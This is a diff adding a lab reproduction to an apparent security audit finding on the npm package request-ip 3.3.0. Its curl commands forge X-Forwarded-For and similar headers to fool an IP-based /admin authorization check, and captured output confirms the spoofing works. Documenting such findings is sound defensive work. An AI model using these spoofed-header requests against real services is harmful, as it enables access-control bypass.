@@ -42,4 +42,70 @@ Any remote attacker can forge all non-connection-level IP headers (`x-client-ip`
 
 ---
 
+---
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/npm-request-ip/`
+
+**Pinned version:** request-ip 3.3.0
+
+### Steps
+
+1. **Install dependencies:**
+   ```bash
+   npm install request-ip@3.3.0 express
+   ```
+
+2. **Start a test server** that uses `request-ip` to determine the client IP and make an authorization decision:
+   ```javascript
+   const express = require('express');
+   const requestIp = require('request-ip');
+   const app = express();
+   app.use(requestIp.mw());
+   app.get('/admin', (req, res) => {
+     const ip = req.clientIp;
+     const isInternal = ip === '127.0.0.1' || ip === '::1';
+     res.json({ client_ip: ip, authorized: isInternal });
+   });
+   app.listen(5557);
+   ```
+
+3. **Send a request with spoofed headers:**
+   ```bash
+   # Spoof via X-Forwarded-For
+   curl -s http://127.0.0.1:5557/admin -H "X-Forwarded-For: 8.8.8.8"
+   # -> request-ip reports 8.8.8.8 instead of 127.0.0.1
+
+   # Spoof via multiple headers
+   curl -s http://127.0.0.1:5557/admin \
+     -H "X-Forwarded-For: 1.2.3.4" \
+     -H "X-Real-Ip: 1.1.1.1" \
+     -H "CF-Connecting-IP: 9.9.9.9" \
+     -H "True-Client-IP: 4.4.4.4"
+   ```
+
+4. **Verify** that `request-ip` trusts the forged header over the actual TCP peer.
+
+### Observed output (from `targets/labs/npm-request-ip/results.txt`)
+
+```
+request-ip PoC -- version: 3.3.0
+
+  no-spoof headers -> client_ip_reported_by_requestip: '127.0.0.1', message: 'AUTHORIZED as internal IP'
+
+  X-Forwarded-For: 8.8.8.8 -> client_ip_reported_by_requestip: '8.8.8.8', message: 'denied'
+
+  multiple-spoof -> client_ip_reported_by_requestip: '1.2.3.4', message: 'denied'
+
+  >>> RIP-01 CONFIRMED: client IP is taken from untrusted header <<<
+      request-ip reported 1.2.3.4 instead of 127.0.0.1
+```
+
+### Verdict
+
+**CONFIRMED.** Any unauthenticated client can forge `X-Forwarded-For` (or 9 other headers) to spoof their IP. The library trusts these headers without requiring trusted proxy configuration.
+
+---
+
 **Pipeline:** 7 raw findings → 1 confirmed (1 MEDIUM breachable)
